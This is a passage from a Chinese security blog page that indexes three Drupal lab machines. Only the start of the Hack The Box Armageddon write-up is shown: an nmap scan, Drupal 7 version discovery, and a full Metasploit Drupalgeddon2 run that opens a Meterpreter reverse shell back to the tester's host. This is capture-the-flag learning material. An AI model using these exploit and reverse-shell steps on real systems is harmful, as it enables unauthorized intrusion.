---
title: Drupal 入口与本地权限衔接
url: https://lucifer11.xyz/knowledge/cms-drupal/
source: 0xfd's blog
date: 2026-11-25
fetch_date: 2026-11-26T10:13:44.300542
---

# Drupal 入口与本地权限衔接

![0xfd's blog](/images/fifteen-katana-zero-katana-zero.gif)
[0xfd's blog](/)

by 0xfd

* [首页](/)
* [知识库](/knowledge/)
* [导读](/guide/)
* [分类](/categories/)
* [标签](/tags/)
* [归档](/archives/)
* [关于](/about/)
* 搜索

* 文章目录
* 站点概览

1. [分析重点](#%E5%88%86%E6%9E%90%E9%87%8D%E7%82%B9)
2. [案例与技术索引](#%E6%A1%88%E4%BE%8B%E4%B8%8E%E6%8A%80%E6%9C%AF%E7%B4%A2%E5%BC%95)
3. [Drupal 凭据落点与 snap 权限](#Drupal-%E5%87%AD%E6%8D%AE%E8%90%BD%E7%82%B9%E4%B8%8E-snap-%E6%9D%83%E9%99%90)
4. [Drupal 执行与 wget 文件权限](#Drupal-%E6%89%A7%E8%A1%8C%E4%B8%8E-wget-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90)
5. [应用入口与 Dirty COW 分支](#%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E4%B8%8E-Dirty-COW-%E5%88%86%E6%94%AF)

![253](/images/fifteen-katana-zero-katana-zero.gif)

253

漏洞分析、利用机制、二进制研究与安全工程

[83
日志](/archives/)

[65
分类](/categories/)

[312
标签](/tags/)

GitHub

E-Mail

Twitter

FB Page

YouTube

Instagram

infosec.exchange

![Creative Commons](https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg)

0%

链接

* atsud0
* 记忆里的纯真
* 小离

# Drupal 入口与本地权限衔接

发表于
2026-11-25

分类于

[Web安全](/categories/Web%E5%AE%89%E5%85%A8/)
，
[CMS与插件](/categories/Web%E5%AE%89%E5%85%A8/CMS%E4%B8%8E%E6%8F%92%E4%BB%B6/)

阅读次数：

本文字数：
7.2k

阅读时长 ≈
26 分钟

同样的 CMS 入口可能接到完全不同的本地权限问题。本章对照 Drupal 的版本信息、配置文件、用户哈希与后续 snap、SUID 和内核路线，保留每段操作所处的身份。

同样的 CMS 入口可能接到完全不同的本地权限问题。本章对照 Drupal 的版本信息、配置文件、用户哈希与后续 snap、SUID 和内核路线，保留每段操作所处的身份。

[知识库目录](/knowledge/)
[研究导读](/guide/)
[下载 Markdown](/knowledge/cms-drupal/source.md)
展开全部技术记录

## 分析重点

Armageddon 的 snap 分支保留原脚本失败后对载荷内容的处理。

Os-hackNos-1 的 wget 权限与 Lampiao 的内核竞争条件不能互相替代。

数据库凭据、文件权限和编译环境均随各案例完整保留。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [Drupal 凭据落点与 snap 权限](#case-armageddon) | Armageddon | Drupal、配置泄露、snap |
| [Drupal 执行与 wget 文件权限](#case-hacknos-os-hacknos-1) | hackNos-Os-hackNos-1 | Drupal、SUID、wget |
| [应用入口与 Dirty COW 分支](#case-lampiao-1) | Lampiao-1 | Drupal、Dirty COW、内核 |

## Drupal 凭据落点与 snap 权限

Drupalgeddon2 提供初始执行，settings.php 中的数据库配置用于定位用户哈希。后半段保留了直接运行 dirty\_sock 脚本失败后的 snap 内容提取方法。

来源 Armageddon · 原记录 2021-03-29 · 12 个代码块 · 4 处图片引用

查看分析过程、攻击步骤与完整代码

#### introduce

OS: Linux
Difficulty: Easy
Points: 20
Release: 27 Mar 2021
IP: 10.10.10.233

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1912.jpg)
* ![my htb rank](http://www.hackthebox.eu/badge/image/235857)

#### information gathering

first use nmap as usaul

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` ┌──(root💀kali)-[~/hackthebox/machine/Armageddon] └─# nmap -sV -v -p- --min-rate=10000 10.10.10.233 PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0) 80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) ``` |

So basically Two ports are opened 22:ssh 80:http

#### Port-80

There is a simple login page.
Let’s check the source code for some juicy stuff.

|  |  |
| --- | --- |
| ``` 1 ``` | ``` <meta name="Generator" content="Drupal 7 (http://drupal.org)" /> ``` |

I found the drupal version “Drupal 7”.
Let’s search on google for exploit for this specific version.

Found a rapid7 page

* Drupal Drupalgeddon 2 Forms API Property Injection

Let’s try this real quick.

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 ``` | ``` msf6 > use exploit/unix/webapp/drupal_drupalgeddon2 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set lhost tun0 lhost => tun0 msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rhost 10.10.10.233 rhost => 10.10.10.233 msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show options  Module options (exploit/unix/webapp/drupal_drupalgeddon2):     Name         Current Setting  Required  Description    ----         ---------------  --------  -----------    DUMP_OUTPUT  false            no        Dump payload command output    PHP_FUNC     passthru         yes       PHP function to execute    Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]    RHOSTS       10.10.10.233     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'    RPORT        80               yes       The target port (TCP)    SSL          false            no        Negotiate SSL/TLS for outgoing connections    TARGETURI    /                yes       Path to Drupal install    VHOST                         no        HTTP server virtual host   Payload options (php/meterpreter/reverse_tcp):     Name   Current Setting  Required  Description    ----   ---------------  --------  -----------    LHOST  tun0             yes       The listen address (an interface may be specified)    LPORT  4444             yes       The listen port   Exploit target:     Id  Name    --  ----    0   Automatic (PHP In-Memory)   msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run  [*] Started reverse TCP handler on 10.10.14.5:4444  [*] Executing automatic check (disable AutoCheck to override) [+] The target is vulnerable. [*] Sending stage (39282 bytes) to 10.10.10.233 [*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.233:59810) at 2021-03-29 07:57:22 -0400 id  meterpreter > id [-] Unknown command: id. meterpreter > getuid Server username:  (48) meterpreter > pwd /var/www/html meterpreter > ls Listing: /var/www/html ======================  Mode              Size    Type  Last modified              Name ----              ----    ----  -------------              ---- 100644/rw-r--r--  317     fil   2017-06-21 14:20:18 -0400  .editorconfig 100644/rw-r--r--  174     fil   2017-06-21 14:20:18 -0400  .gitignore 100644/rw-r--r--  6112    fil   2017-06-21 14:20:18 -0400  .htaccess 100644/rw-r--r--  111613  fil   2017-06-21 14:20:18 -0400  CHANGELOG.txt 100644/rw-r--r--  1481    fil   2017-06-21 14:20:18 -0400  COPYRIGHT.txt 100644/rw-r--r--  1717    fil   2017-06-21 14:20:18 -0400  INSTALL.mysql.txt 100644/rw-r--r--  1874    fil   2017-06-21 14:20:18 -0400  INSTALL.pgsql.txt 100644/rw-r--r--  1298    fil   2017-06-21 14:20:18 -0400  INSTALL.sqlite.txt 100644/rw-r--r--  17995   fil   2017-06-21 14:20:18 -0400  INSTALL.txt 100644/rw-r--r--  18092   fil   2016-11-16 18:57:05 -0500  LICENSE.txt 100644/rw-r--r--  8710    fil   2017-06-21 14:20:18 -0400  MAINTAINERS.txt 100644/rw-r--r--  5382    fil   2017-06-21 14:20:18 -0400  README.txt 100644/rw-r--r--  10123   fil   2017-06-21 14:20:18 -0400  UPGRADE.txt 100644/rw-r--r--  6604    fil   2017-06-21 14:20:18 -0400  authorize.php 100644/rw-r--r--  720     fil   2017-06-21 14:20:18 -0400  cron.php 40755/rwxr-xr-x   4096    dir   2017-06-21 14:20:18 -0400  includes 100644/rw-r--r--  529     fil   2017-06-21 14:20:18 -0400  index.php 100644/rw-r--r--  703     fil   2017-06-21 14:20:18 -0400  install.php 100777/rwxrwxrwx  119357  fil   2021-03-28 22:59:36 -0400  linlog.txt 40755/rwxr-xr-x   4096    dir   2020-12-04 05:10:24 -0500  misc 40755/rwxr-xr-x   4096    dir   2017-06-21 14:20:18 -0400  modules 40755/rwxr-xr-x   70      dir   2017-06-21 14:20:18 -0400  profiles 100644/rw-r--r--  2189    fil   2017-06-21 14:20:18 -0400  robots.txt 40755/rwxr-xr-x   261     dir   2017-06-21 14:20:18 -0400  scripts 100755/rwxr-xr-x  55      fil   2021-03-28 22:43:06 -0400  shell.sh 40755/rwxr-xr-x   75      dir   2017-06-21 14:20:18 -0400  sites 40755/rwxr-xr-x   94      dir   2017-06-21 14:20:18 -0400  themes 100644/rw-r--r--  19986   fil   2017-06-21 14:20:18 -0400  update.php 100644/rw-r--r--  2200    fil   2017-06-21 14:20:18 -0400  web.config 100644/rw-r--r--  417     fil   2017-06-21 14:20:18 -0400  xmlrpc.php ``` |

We got the shell.

Now let’s enumerate some good stuff.

I found an interesting file called settings.php inside /var/www/html/sites/default/ directory. which has contain mysql creads.

|  |  |
| --...